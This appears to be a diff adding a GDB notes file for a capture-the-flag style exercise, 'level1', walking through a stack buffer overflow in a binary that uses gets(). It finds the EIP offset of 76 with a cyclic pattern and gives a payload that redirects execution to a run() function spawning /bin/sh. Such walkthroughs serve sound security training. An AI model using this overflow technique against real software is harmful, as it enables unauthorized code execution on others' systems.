@@ -1,0 +1,41 @@
+
+# GDB Analysis Commands for Level1
+# =================================
+
+# 1. Start GDB and load binary
+gdb ./level1
+
+# 2. Set up GDB environment
+set disassembly-flavor intel
+set pagination off
+
+# 3. Analyze functions
+info functions
+# Output shows: run() and main() functions
+
+# 4. Find run() function address
+print &run
+# Output: $1 = (void (*)()) 0x8048444 <run>
+
+# 5. Disassemble main function
+disas main
+# Shows gets() call and buffer allocation
+
+# 6. Disassemble run function
+disas run
+# Shows system("/bin/sh") call
+
+# 7. Find buffer overflow offset using pattern
+pattern create 100
+# Generates: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+
+run
+# Paste pattern when prompted
+
+# 8. Find exact offset
+pattern offset $eip
+# Output: EIP+0 found at offset: 76
+
+# 9. Verify exploit payload
+# Payload: 'A'*76 + struct.pack('<I', 0x8048444)
+# Result: Successful redirection to run() function
